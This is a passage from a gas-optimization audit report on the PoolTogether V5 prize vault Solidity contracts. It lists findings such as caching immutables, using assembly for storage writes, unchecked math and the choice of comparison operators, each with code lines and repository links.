[Solidity Documentation](https://docs.soliditylang.org/en/v0.8.20/ir-breaking-changes.html#solidity-ir-based-codegen-changes).

6 issue instances in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVault.sol
File: pt-v5-vault/src/PrizeVaultFactory.sol
File: pt-v5-vault/src/TwabERC20.sol
File: pt-v5-vault/src/abstract/Claimable.sol
File: pt-v5-vault/src/abstract/HookManager.sol
File: pt-v5-vault/src/interfaces/IVaultHooks.sol
```

[1](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L1) | [1](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L1) | [1](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L1) | [1](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L1) | [1](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/HookManager.sol#L1) | [1](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/interfaces/IVaultHooks.sol#L1)

## [G-03] Use `immutable`s variables directly, instead of caching them in stack

Caching `immutable`s variable in stack is not necessary, and it will cost more gas.

2 issue instances in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVault.sol
599: uint256 _yieldBuffer = yieldBuffer
825: uint256 _yieldBuffer = yieldBuffer
```

[599](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L599) | [825](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L825)

## [G-04] Assembly: Check `msg.sender` using xor and the scratch space

See [this](https://code4rena.com/reports/2023-05-juicebox#g-06-use-assembly-to-validate-msgsender) prior finding for details on the conversion

4 issue instances in 2 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
261: if (msg.sender != liquidationPair) {
269: if (msg.sender != yieldFeeRecipient) {
532: if (_owner != msg.sender) {
```

[261](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L261) | [269](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L269) | [532](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L532)

```solidity
File: pt-v5-vault/src/abstract/Claimable.sol
53: if (msg.sender != claimer) revert CallerNotClaimer(msg.sender, claimer);
```

[53](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L53)

</details>

## [G-05] Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`

Combining multiple address/ID mappings into a single mapping to a struct can lead to gas savings. By refactoring multiple mappings into a singular mapping with a struct, you can save on storage slots, which in turn can reduce the gas cost in certain operations.
Prioritize this refactor if optimizing gas is a primary concern for your contract's operations.

2 issue instances in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVaultFactory.sol
69: mapping(address vault => bool deployedByFactory) public deployedVaults
72: mapping(address deployer => uint256 nonce) public deployerNonces
```

[69](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L69) | [72](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L72)

## [G-06] Assembly: Use scratch space when building emitted events with two data arguments

Using the scratch space for more than one, but at most two words worth of data (non-indexed arguments) will save gas over needing Solidity's abi memory expansion used for emitting normally.

3 issue instances in 2 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
562: emit Sponsor(_owner, _assets, _shares)
697: emit TransferYieldOut(msg.sender, _tokenOut, _receiver, _amountOut, _yieldFee)
```

[562](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L562) | [697](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L697)

```solidity
File: pt-v5-vault/src/PrizeVaultFactory.sol
123: emit NewPrizeVault(
            _vault,
            _yieldVault,
            _prizePool,
            _name,
            _symbol
        )
```
[123](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L123)

</details>

## [G-07] Stack variable is only used once

If the variable is only accessed once, it's cheaper to use the assigned value directly that one time, and save the 3 gas the extra stack assignment would spend.

4 issue instances in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVault.sol
/// @audit - `totalDebt_` variable
376: uint256 totalDebt_ = _totalDebt(_totalSupply)
/// @audit - `_yieldVaultShares` variable
865: uint256 _yieldVaultShares = yieldVault.previewDeposit(_assetsWithDust)
/// @audit - `_assetsUsed` variable
866: uint256 _assetsUsed = yieldVault.mint(_yieldVaultShares, address(this))
/// @audit - `_yieldVaultShares` variable
934: uint256 _yieldVaultShares = yieldVault.previewWithdraw(_assets - _latentAssets)
```

[376](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L376) | [865](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L865) | [866](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L866) | [934](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L934)

## [G-08] `abi.encodePacked` is more gas efficient than `abi.encode`

`abi.encode()` pads all elementary types to 32 bytes, whereas `abi.encodePacked()` will only use the minimal required memory to encode the data.

```solidity
    function testPacking() public pure returns (bytes memory) {
        // return abi.encode("string"); // 1120 gas
        // return abi.encodePacked("string"); // 913 gas
    }
```

1 issue instance in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVaultFactory.sol
103: abi.encode(msg.sender, deployerNonces[msg.sender]++)
```

[103](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L103)

## [G-09] Use `assembly` to write mutable storage values

Writing to storage using `assembly` is more gas efficient.

```solidity
    function writeStorage() external {
        // storageNumber = 10; // 2358 gas
        // assembly {
        //     sstore(storageNumber.slot, 10) // 2350 gas
        // }
        // storageAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc3; // 2411 gas
        // assembly {
        //     sstore(storageAddr.slot, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc3) // 2350 gas
        // }
    }
```

6 issue instances in 4 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
745: liquidationPair = _liquidationPair
951: yieldFeePercentage = _yieldFeePercentage
959: yieldFeeRecipient = _yieldFeeRecipient
```

[745](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L745) | [951](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L951) | [959](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L959)

```solidity
File: pt-v5-vault/src/PrizeVaultFactory.sol
121: deployedVaults[address(_vault)] = true
```

[121](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L121)

```solidity
File: pt-v5-vault/src/abstract/Claimable.sol
130: claimer = _claimer
```

[130](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L130)

```solidity
File: pt-v5-vault/src/abstract/HookManager.sol
30: _hooks[msg.sender] = hooks
```

[30](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/HookManager.sol#L30)

</details>

## [G-10] Use `revert()` to gain maximum gas savings

If you don't need error messages, or you want gain maximum gas savings - `revert()` is a cheapest way to revert transaction in terms of gas.

```solidity
    revert(); // 117 gas 
    require(false); // 132 gas
    revert CustomError(); // 157 gas
    assert(false); // 164 gas
    revert("Custom Error"); // 406 gas
    require(false, "Custom Error"); // 421 gas
```

24 issue instances in 3 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
262: revert CallerNotLP(msg.sender, liquidationPair)
270: revert CallerNotYieldFeeRecipient(msg.sender, yieldFeeRecipient)
300: revert YieldVaultZeroAddress()
301: revert OwnerZeroAddress()
458: revert ZeroTotalAssets()
533: revert PermitCallerNotOwner(msg.sender, _owner)
612: revert MintZeroShares()
615: revert SharesExceedsYieldFeeBalance(_shares, _yieldFeeBalance)
665: revert LiquidationAmountOutZero()
680: revert LiquidationExceedsAvailable(_amountOut + _yieldFee, _availableYield)
694: revert LiquidationTokenOutNotSupported(_tokenOut)
710: revert LiquidationTokenInNotPrizeToken(_tokenIn, _prizeToken)
743: revert LPZeroAddress()
844: revert MintZeroShares()
845: revert DepositZeroAssets()
874: revert LossyDeposit(totalAssets(), totalDebt())
894: revert WithdrawZeroAssets()
895: revert BurnZeroShares()
949: revert YieldFeePercentageExceedsMax(_yieldFeePercentage, MAX_YIELD_FEE)
```

[262](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L262) | [270](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L270) | [300](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L300) | [301](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L301) | [458](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L458) | [533](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L533) | [612](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L612) | [615](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L615) | [665](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L665) | [680](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L680) | [694](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L694) | [710](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L710) | [743](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L743) | [844](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L844) | [845](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L845) | [874](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L874) | [894](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L894) | [895](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L895) | [949](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L949)

```solidity
File: pt-v5-vault/src/TwabERC20.sol
47: revert TwabControllerZeroAddress()
```

[47](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L47)

```solidity
File: pt-v5-vault/src/abstract/Claimable.sol
53: revert CallerNotClaimer(msg.sender, claimer)
65: revert PrizePoolZeroAddress()
97: revert ClaimRecipientZeroAddress()
129: revert ClaimerZeroAddress()
```

[53](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L53) | [65](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L65) | [97](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L97) | [129](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L129)

</details>

## [G-11] `>=` costs less gas than `>`

The compiler uses opcodes GT and ISZERO for solidity code that uses `>`, but only requires LT for `>=`, which saves 3 gas. If `<` is being used, the condition can be inverted. In cases where a for-loop is being used, one can count down rather than up, in order to use the optimal operator.

1 issue instance in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVault.sol
684: if (_yieldFee > 0) {
```

[684](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L684)

## [G-12] Consider pre-calculating the address of `address(this)` to save gas

Use foundry's script.sol or solady's LibRlp.sol to save the value in a constant, which will avoid having to spend gas to push the value on the stack every time it's used.

25 issue instances in 2 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
337: return yieldVault.convertToAssets(yieldVault.balanceOf(address(this))) + _asset.balanceOf(address(this));
337: return yieldVault.convertToAssets(yieldVault.balanceOf(address(this))) + _asset.balanceOf(address(this));
382: uint256 _latentBalance = _asset.balanceOf(address(this));
383: uint256 _maxYieldVaultDeposit = yieldVault.maxDeposit(address(this));
405: uint256 _maxWithdraw = _maxYieldVaultWithdraw() + _asset.balanceOf(address(this));
416: uint256 _maxWithdraw = _maxYieldVaultWithdraw() + _asset.balanceOf(address(this));
539: if (_asset.allowance(_owner, address(this)) != _assets) {
540: IERC20Permit(address(_asset)).permit(_owner, address(this), _assets, _deadline, _v, _r, _s);
558: if (twabController.delegateOf(address(this), _owner) != SPONSORSHIP_ADDRESS) {
634: if (_tokenOut == address(this)) {
639: _maxAmountOut = _maxYieldVaultWithdraw() + _asset.balanceOf(address(this));
691: } else if (_tokenOut == address(this)) {
713: prizePool.contributePrizeTokens(address(this), _amountIn);
726: return (_tokenOut == address(_asset) || _tokenOut == address(this)) && _liquidationPair == liquidationPair;
747: emit LiquidationPairSet(address(this), address(_liquidationPair));
856: address(this),
861: uint256 _assetsWithDust = _asset.balanceOf(address(this));
866: uint256 _assetsUsed = yieldVault.mint(_yieldVaultShares, address(this));
922: return yieldVault.convertToAssets(yieldVault.maxRedeem(address(this)));
931: uint256 _latentAssets = _asset.balanceOf(address(this));
936: yieldVault.redeem(_yieldVaultShares, address(this), address(this));
936: yieldVault.redeem(_yieldVaultShares, address(this), address(this));
938: if (_receiver != address(this)) {
```

[337](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L337) | [337](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L337) | [382](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L382) | [383](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L383) | [405](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L405) | [416](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L416) | [539](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L539) | [540](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L540) | [558](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L558) | [634](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L634) | [639](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L639) | [691](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L691) | [713](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L713) | [726](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L726) | [747](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L747) | [856](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L856) | [861](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L861) | [866](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L866) | [922](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L922) | [931](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L931) | [936](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L936) | [936](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L936) | [938](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L938)

```solidity
File: pt-v5-vault/src/TwabERC20.sol
59: return twabController.balanceOf(address(this), _account);
64: return twabController.totalSupply(address(this));
```

[59](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L59) | [64](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L64)

</details>

## [G-13] Call `msg.sender` directly instead of caching it

In the instance below, instead of caching `msg.sender` and incurring unnecessary stack manipulation, we can call `msg.sender` directly.

```solidity
/// 3047 gas
function test() external {
    internalFunc(msg.sender);
    internalFunc(msg.sender);
    internalFunc(msg.sender);
}
// 3061 gas
function test() external {
    address callerLocal = msg.sender;
    internalFunc(callerLocal);
    internalFunc(callerLocal);
    internalFunc(callerLocal);
}
```

1 issue instance in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVault.sol
553: address _owner = msg.sender
```

[553](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L553)


## [G-14] Use `unchecked` for Non-Loop Increment/Decrement operations

*Disclaimer: You should be sure that underflow is not possible. Using `unchecked` increments can save gas by bypassing the built-in overflow checks. This can save 30-40 gas per iteration. It is recommended to use unchecked increments when overflow is not possible.

1 issue instance in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVaultFactory.sol
103: deployerNonces[msg.sender]++
```

[103](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L103)


## [G-15] Constructors can be marked `payable`

Payable functions cost less gas to execute, since the compiler does not have to add extra checks to ensure that a payment wasn't provided. A constructor can safely be marked as `payable`, since only the deployer would be able to pass funds, and the project itself would not pass any funds. This could save an average of about 21 gas per call, in addition to the extra deployment cost.

3 issue instances in 3 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
289: constructor(
        string memory name_,
        string memory symbol_,
        IERC4626 yieldVault_,
        PrizePool prizePool_,
        address claimer_,
        address yieldFeeRecipient_,
        uint32 yieldFeePercentage_,
        uint256 yieldBuffer_,
        address owner_
    ) TwabERC20(name_, symbol_, prizePool_.twabController()) Claimable(prizePool_, claimer_) Ownable(owner_) {
```

[289](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L289)

```solidity
File: pt-v5-vault/src/TwabERC20.sol
42: constructor(
        string memory name_,
        string memory symbol_,
        TwabController twabController_
    ) ERC20(name_, symbol_) ERC20Permit(name_) {
```

[42](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L42)

```solidity
File: pt-v5-vault/src/abstract/Claimable.sol
64: constructor(PrizePool prizePool_, address claimer_) {
```

[64](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L64)

</details>

## [G-16] Reduce gas usage by moving to Solidity 0.8.19 or later

See [this](https://soliditylang.org/blog/2023/02/22/solidity-0.8.19-release-announcement/#preventing-dead-code-in-runtime-bytecode) link for the full details. Additionally, every new release has new optimizations, which will save gas.

1 issue instance in 1 file:

```solidity
File: pt-v5-vault/src/abstract/HookManager.sol
2: pragma solidity ^0.8.0;
```

[2](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/HookManager.sol#L2)

## [G-17] Reduce deployment costs by tweaking contracts' metadata

The Solidity compiler appends 53 bytes of metadata to the smart contract code which translates to an extra 10,600 gas (200 per bytecode) `+` the calldata cost (16 gas per non-zero bytes, 4 gas per zero-byte). This translates to up to 848 additional gas in calldata cost. One way to reduce this cost is by optimizing the IPFS hash that gets appended to the smart contract code.

Why is this important?
- The metadata adds an extra 53 bytes, resulting in an additional 10,600 gas cost for deployment.
- It also incurs up to 848 additional gas in calldata cost.

Options to Reduce Gas:
1. Use the `--no-cbor-metadata` compiler option to exclude metadata, but this might affect contract verification.
2. Mine for code comments that lead to an IPFS hash with more zeros, reducing calldata costs.

6 issue instances in 6 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
1: Consider optimizing the IPFS hash during deployment.
```

[1](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L1)

```solidity
File: pt-v5-vault/src/PrizeVaultFactory.sol
1: Consider optimizing the IPFS hash during deployment.
```

[1](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L1)

```solidity
File: pt-v5-vault/src/TwabERC20.sol
1: Consider optimizing the IPFS hash during deployment.
```

[1](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L1)

```solidity
File: pt-v5-vault/src/abstract/Claimable.sol
1: Consider optimizing the IPFS hash during deployment.
```

[1](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L1)

```solidity
File: pt-v5-vault/src/abstract/HookManager.sol
1: Consider optimizing the IPFS hash during deployment.
```

[1](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/HookManager.sol#L1)

```solidity
File: pt-v5-vault/src/interfaces/IVaultHooks.sol
1: Consider optimizing the IPFS hash during deployment.
```

[1](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/interfaces/IVaultHooks.sol#L1)

</details>

## [G-18] Use Pre-Increment/Decrement (`++i`/`--i`) to save gas

Using pre-increment (`++i`) or pre-decrement (`--i`) operators is more gas-efficient compared to their post counterparts (`i++` or `i--`). This is because pre-increment/decrement operators avoid the need for an additional temporary variable that stores the original value of the iterator. This subtle difference results in saving of around 5 gas units per operation, which can accumulate to substantial savings in gas costs in contracts with frequent increment/decrement operations.

1 issue instance in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVaultFactory.sol
103: salt: keccak256(abi.encode(msg.sender, deployerNonces[msg.sender]++))
```

[103](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L103)


## [G-19] Nesting `if`-statements is cheaper than using `&&`

Optimization of condition checks in your smart contract is a crucial aspect in ensuring gas efficiency. Specifically, substituting multiple `&&` checks with nested `if` statements can lead to substantial gas savings.

When evaluating multiple conditions within a single `if` statement using the `&&` operator, each condition will consume gas even if a preceding condition fails. However, if these checks are broken down into nested `if` statements, execution halts as soon as a condition fails, saving the gas that would have been consumed by subsequent checks.

This practice is especially beneficial in scenarios where the `if` statement isn't followed by an `else` statement. The reason being, when an `else` statement is present, all conditions must be checked regardless to determine the correct branch of execution.

By reworking your code to utilize nested `if` statements, you can optimize gas usage, reduce execution cost, and enhance your contract's performance.

1 issue instance in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVault.sol
776: if (success && encodedDecimals.length >= 32) {
```

[776](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L776)

## [G-20] Avoid transferring amounts of zero in order to save gas

Performing token or Ether transfers with a zero amount may result in unnecessary gas consumption. The absence of a zero-amount check before a transfer or send operation can lead to wasted gas, as the state of the contract remains the same even if the amount is zero. 

Adding a conditional check for zero amounts can prevent these costly, unnecessary operations, thereby optimizing the contract's gas usage.

1 issue instance in 1 file:

```solidity
File: pt-v5-vault/src/TwabERC20.sol
/// @audit `SafeCast.toUint96(_amount)` has not been checked for zero value before transfer
101: twabController.transfer(_from, _to, SafeCast.toUint96(_amount));
```

[101](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L101)

## [G-21] `>=` costs less gas than `>`

The Solidity compiler requires fewer opcodes when the `>=` operator is used in place of the `>` operator. Specifically, the compiler uses GT and ISZERO opcodes for `>` but only requires LT for `>=`, saving 3 gas. Thus, wherever applicable, it's recommended to use `>=` instead of `>` to enhance gas efficiency in your code. Same applies for `<=` and `<`.

6 issue instances in 1 file:

```solidity
File: pt-v5-vault/src/PrizeVault.sol
422: if (_ownerShares > _maxWithdraw) {
615: if (_shares > _yieldFeeBalance) revert SharesExceedsYieldFeeBalance(_shares, _yieldFeeBalance);
679: if (_amountOut + _yieldFee > _availableYield) {
874: if (totalAssets() < totalDebt()) revert LossyDeposit(totalAssets(), totalDebt());
932: if (_assets > _latentAssets) {
948: if (_yieldFeePercentage > MAX_YIELD_FEE) {
```

[422](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L422) | [615](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L615) | [679](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L679) | [874](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L874) | [932](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L932) | [948](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L948)

## [G-22] Use `unchecked` for math operations if they already checked

Some subtraction operations in the contract have implicit checks that prevent underflow. To optimize gas, consider wrapping such operations in an `unchecked` block. Always review the logic thoroughly before making changes to ensure the safety of operations.

5 issue instances in 1 file:
```solidity
File: pt-v5-vault/src/PrizeVault.sol
/// @audit - mathematical operation `_maxYieldVaultDeposit - _latentBalance` checked above in line:
/// 384: if (_latentBalance >= _maxYieldVaultDeposit) {
388: _maxDeposit = _maxYieldVaultDeposit - _latentBalance;
/// @audit - mathematical operation `_amountOut + _yieldFee` checked above in line:
/// 679: if (_amountOut + _yieldFee > _availableYield) {
680: revert LiquidationExceedsAvailable(_amountOut + _yieldFee, _availableYield);
/// @audit - mathematical operation `_totalAssets - totalDebt_` checked above in line:
/// 809: if (totalDebt_ >= _totalAssets) {
813: return _totalAssets - totalDebt_;
/// @audit - mathematical operation `totalYieldBalance_ - _yieldBuffer` checked above in line:
/// 826: if (totalYieldBalance_ >= _yieldBuffer) {
828: return totalYieldBalance_ - _yieldBuffer;
/// @audit - mathematical operation `_assets - _latentAssets` checked above in line:
/// 932: if (_assets > _latentAssets) {
934: uint256 _yieldVaultShares = yieldVault.previewWithdraw(_assets - _latentAssets);
```

[388](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L388) | [680](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L680) | [813](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L813) | [828](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L828) | [934](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L934)

## [G-23] Using `private` rather than `public`, saves gas

Public storage variables increase the contract's size due to the implicit generation of public getter functions. This makes the contract larger and could increase deployment and interaction costs. If you do not require other contracts to read these variables, consider making them `private`. 

Example:
```solidity
/// 145426 gas to deploy
contract PublicState {
    address public first;
    address public second;
}
/// 77126 gas to deploy
contract PrivateState {
    address private first;
    address private second;
}
```

16 issue instances in 4 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
74: uint32 public constant FEE_PRECISION = 1e9;
80: uint32 public constant MAX_YIELD_FEE = 9e8;
112: uint256 public immutable yieldBuffer;
115: IERC4626 public immutable yieldVault;
119: uint32 public yieldFeePercentage;
122: address public yieldFeeRecipient;
125: uint256 public yieldFeeBalance;
128: address public liquidationPair;
```

[74](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L74) | [80](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L80) | [112](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L112) | [115](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L115) | [119](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L119) | [122](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L122) | [125](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L125) | [128](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L128)

```solidity
File: pt-v5-vault/src/PrizeVaultFactory.sol
63: uint256 public constant YIELD_BUFFER = 1e5;
66: PrizeVault[] public allVaults;
69: mapping(address vault => bool deployedByFactory) public deployedVaults;
72: mapping(address deployer => uint256 nonce) public deployerNonces;
```

